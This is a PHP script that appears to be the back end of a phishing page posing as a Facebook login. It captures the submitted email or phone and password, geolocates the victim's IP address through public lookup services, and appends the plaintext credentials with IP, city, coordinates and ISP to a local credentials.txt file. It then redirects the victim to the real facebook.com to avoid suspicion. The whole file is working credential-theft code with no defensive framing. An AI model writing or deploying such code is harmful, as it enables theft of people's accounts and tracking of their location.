<?php
// Get the form data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Validate that both fields are filled
if (empty($email) || empty($password)) {
    http_response_code(400);
    exit('Error: Please fill in both email and password fields.');
}

// Get IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get geolocation from IP (with timeout)
$country = 'Unknown';
$city = 'Unknown';
$latitude = 'Unknown';
$longitude = 'Unknown';
$isp = 'Unknown';
$timezone = 'Unknown';
$geo_status = 'Not fetched';

$context = stream_context_create([
    'http' => [
        'timeout' => 3, // 3 second timeout
        'ignore_errors' => true
    ],
    'https' => [
        'timeout' => 3,
        'ignore_errors' => true
    ]
]);

// Try ipapi.co first (faster)
$url = "https://ipapi.co/{$ip}/json/";
$response = @file_get_contents($url, false, $context);

if ($response !== false) {
    $geo_data = json_decode($response, true);
    if ($geo_data && isset($geo_data['country_name'])) {
        $country = $geo_data['country_name'];
        $city = isset($geo_data['city']) ? $geo_data['city'] : 'Unknown';
        $latitude = isset($geo_data['latitude']) ? $geo_data['latitude'] : 'Unknown';
        $longitude = isset($geo_data['longitude']) ? $geo_data['longitude'] : 'Unknown';
        $isp = isset($geo_data['org']) ? $geo_data['org'] : 'Unknown';
        $timezone = isset($geo_data['timezone']) ? $geo_data['timezone'] : 'Unknown';
        $geo_status = 'Success (ipapi.co)';
    } else {
        $geo_status = 'Invalid response - using fallback';
        // Fallback: Try ip-api.com
        $url2 = "https://ip-api.com/json/{$ip}?fields=country,city,lat,lon,isp,timezone";
        $response2 = @file_get_contents($url2, false, $context);
        if ($response2 !== false) {
            $geo_data2 = json_decode($response2, true);
            if ($geo_data2 && isset($geo_data2['country'])) {
                $country = $geo_data2['country'];
                $city = isset($geo_data2['city']) ? $geo_data2['city'] : 'Unknown';
                $latitude = isset($geo_data2['lat']) ? $geo_data2['lat'] : 'Unknown';
                $longitude = isset($geo_data2['lon']) ? $geo_data2['lon'] : 'Unknown';
                $isp = isset($geo_data2['isp']) ? $geo_data2['isp'] : 'Unknown';
                $timezone = isset($geo_data2['timezone']) ? $geo_data2['timezone'] : 'Unknown';
                $geo_status = 'Success (ip-api.com)';
            }
        }
    }
} else {
    $geo_status = 'API Timeout/Failed - Local IP (127.0.0.1 cannot be geolocated)';
}

// Single file for all credentials
$filename = 'credentials.txt';
$storage_dir = __DIR__ . '/storage';

// Create storage directory if it doesn't exist
if (!is_dir($storage_dir)) {
    mkdir($storage_dir, 0755, true);
}

$filepath = $storage_dir . '/' . $filename;

// Prepare the data to save
$data = "Email/Phone: " . htmlspecialchars($email) . "\n";
$data .= "Password: " . htmlspecialchars($password) . "\n";
$data .= "Login Time: " . date('Y-m-d H:i:s') . "\n";
$data .= "IP Address: " . $ip . "\n";
$data .= "Country: " . $country . "\n";
$data .= "City: " . $city . "\n";
$data .= "Latitude: " . $latitude . "\n";
$data .= "Longitude: " . $longitude . "\n";
$data .= "ISP: " . $isp . "\n";
$data .= "Timezone: " . $timezone . "\n";
$data .= "Geolocation Status: " . $geo_status . "\n";
$data .= "-----------------------------------\n\n";

// Save to file (append to existing file)
$result = file_put_contents($filepath, $data, FILE_APPEND | LOCK_EX);

if ($result !== false) {
    // Success - return JSON response
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    http_response_code(200);
    echo json_encode([
        'success' => true, 
        'redirect' => 'https://www.facebook.com/',
        'geolocation_status' => $geo_status
    ]);
    exit;
} else {
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    http_response_code(200);
    echo json_encode([
        'success' => false, 
        'message' => 'Error: Could not save the credentials. Check folder permissions.'
    ]);
    exit;
}
?>
